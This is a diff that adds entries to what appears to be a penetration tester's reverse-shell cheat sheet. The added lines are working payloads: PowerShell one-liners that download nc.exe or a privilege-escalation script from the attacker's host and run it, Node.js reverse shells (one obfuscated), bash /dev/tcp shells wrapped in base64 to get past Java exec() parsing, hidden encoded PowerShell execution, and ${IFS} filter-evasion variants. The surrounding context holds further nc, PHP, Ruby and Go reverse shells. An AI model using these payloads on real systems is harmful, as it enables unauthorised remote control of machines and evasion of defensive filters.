@@ -52,6 +52,12 @@ nc.exe -e cmd.exe $source_ip $source_port
 ```bash
 //$source_ip/$smb_share/tools_windows/bin/nc.exe $source_ip $source_port -e cmd.exe
 ```
+```
+powershell -Command "Invoke-WebRequest http://$source_ip/tools_windows/bin/nc.exe -OutFile c:/Users/Public/nc.exe" & C:/Users/Public/nc.exe -e cmd.exe $source_ip $source_port
+```
+```
+powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://$source_ip/Invoke-LovelyPotato.ps1')"
+```
 
 #### Reverse Shell
 ```powershell
@@ -96,6 +102,8 @@ ncat -nv $target $source_port --ssl
 
 ## Programming Languages
 
+- NodeJS: <https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/>
+
 ### Linux
 ```bash
 php -r '$sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -132,6 +140,45 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$source_ip","$source_port");whil
 ```
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$source_ip:$source_port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+```js
+var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect($source_port, "$source_ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
+```
+```js
+var net = require("net"), sh = require("child_process").exec("\\\\x2fbin\\\\x2fbash"); var client = new net.Socket(); client.connect($source_port, "$source_ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
+```
+
+#### Java 
+- Bypass exec to get a reverse shell: <https://translate.google.lk/translate?sl=auto&tl=en&u=https%3A%2F%2Fblog.spoock.com%2F2018%2F11%2F25%2Fgetshell-bypass-exec%2F>
+- exec() - breaks command into parts by `\t\n\r\f`
+
+Replace `BASE64(-)` with the Based64 encoding of the said value.
+- java.lang.Runtime.exec() Payload Workarounds: <http://www.jackson-t.ca/runtime-exec-payloads.html>
+
+```bash
+bash -c {echo,BASE64(bash -i >& /dev/tcp/$source_ip/$source_port 0>&1)}|{base64,-d}|{bash,-i}
+```
+```bash
+bash -c {echo,BASE64(bash -i >& /dev/tcp/$source_ip/$source_port 0>&1)}|{base64,-D}|{bash,-i}
+```
+```
+powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc BASE64(calc.exe)
+```
+```
+python -c exec('BASE64(calc.exe)'.decode('base64'))
+```
+```
+perl -MMIME::Base64 -e eval(decode_base64('BASE64(calc.exe)'))
+```
+
+```bash
+/bin/bash -c exec 5<>/dev/tcp/$source_ip/$source_port;cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+```bash
+bash -c bash${IFS}-i${IFS}>&/dev/tcp/$source_ip/$source_port<&1
+```
+```bash
+bash -c $@|bash 0 echo bash -i >& /dev/tcp/$source_ip/$source_port 0>&1
 ```
 
 ### Windows
